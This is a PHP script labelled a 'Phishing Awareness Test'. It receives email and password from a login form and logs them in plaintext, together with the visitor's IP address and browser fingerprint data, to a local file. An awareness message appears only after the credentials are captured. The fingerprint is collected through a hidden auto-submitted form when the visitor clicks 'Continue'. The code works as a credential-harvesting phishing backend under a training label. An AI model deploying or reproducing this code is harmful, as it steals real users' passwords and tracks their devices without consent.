<?php
session_start();

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Step 1: Handle login form submission
    if (isset($_POST['email']) && isset($_POST['password']) && !isset($_POST['system_info'])) {
        $_SESSION['phish_email'] = $_POST['email'];
        $_SESSION['phish_password'] = $_POST['password'];
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Phishing Awareness Test</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
                .container { max-width: 500px; margin: 0 auto; background: #fff; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
                h2 { color: #333; }
                p { font-size: 16px; }
                button { padding: 10px 20px; font-size: 16px; background: #0095f6; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
                button:hover { background: #0078c9; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Phishing Awareness Test</h2>
                <p>This was a test! Your login details were captured to show how phishing works. <br><br><b>Never enter your real password on unknown websites!</b></p>
                <button id="continueBtn">Continue</button>
                <script>
                    document.getElementById("continueBtn").onclick = function() {
                        const sysinfo = {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: window.screen.width + "x" + window.screen.height,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        };
                        const form = document.createElement("form");
                        form.method = "POST";
                        form.style.display = "none";
                        const input = document.createElement("input");
                        input.type = "hidden";
                        input.name = "system_info";
                        input.value = JSON.stringify(sysinfo);
                        form.appendChild(input);
                        document.body.appendChild(form);
                        form.submit();
                    };
                </script>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
    // Step 2: Handle system info submission and redirect to awareness page
    if (isset($_POST['system_info']) && isset($_SESSION['phish_email']) && isset($_SESSION['phish_password'])) {
        $email = $_SESSION['phish_email'];
        $password = $_SESSION['phish_password'];
        $ip = get_client_ip();
        $system_info = json_decode($_POST['system_info'], true);
        $userAgent = $system_info['userAgent'] ?? 'Unknown';
        $platform = $system_info['platform'] ?? 'Unknown';
        $language = $system_info['language'] ?? 'Unknown';
        $screen = $system_info['screen'] ?? 'Unknown';
        $timezone = $system_info['timezone'] ?? 'Unknown';
        $log = "Email: $email | Pass: $password | IP: $ip | Time: " . date('Y-m-d H:i:s') .
               " | UA: $userAgent | Platform: $platform | Lang: $language | Screen: $screen | TZ: $timezone\n";
        file_put_contents('users/login_log.txt', $log, FILE_APPEND | LOCK_EX);
        session_destroy();
        header('Location: awareness.html');
        exit;
    }
}
?>
